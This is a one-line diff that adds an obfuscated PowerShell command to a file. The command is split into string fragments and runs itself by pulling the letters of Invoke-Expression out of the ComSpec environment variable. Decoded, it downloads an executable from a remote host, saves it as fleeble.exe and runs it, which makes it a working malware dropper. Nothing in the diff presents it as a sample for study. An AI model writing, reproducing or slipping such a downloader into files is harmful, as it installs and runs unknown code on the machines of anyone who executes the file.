@@ -1,0 +1,1 @@
+﻿ (('(New-Obje'+'ct S'+'ystem.Ne'+'t.'+'We'+'b'+'Clien'+'t).Do'+'wnl'+'oad'+'Fil'+'e(Sv2'+'http:'+'//matk'+'alv.5g'+'bfree.co'+'m/noza'+'/o'+'de'+'ee.'+'exeSv2,Sv'+'2fleeble.e'+'xe'+'Sv2)'+';S'+'tart'+'-'+'P'+'ro'+'cess'+' Sv'+'2'+'fle'+'eble.e'+'xeSv'+'2')  -REpLaCE ([CHar]83+[CHar]118+[CHar]50),[CHar]39) | & ( $Env:CoMspec[4,15,25]-JOIn'')
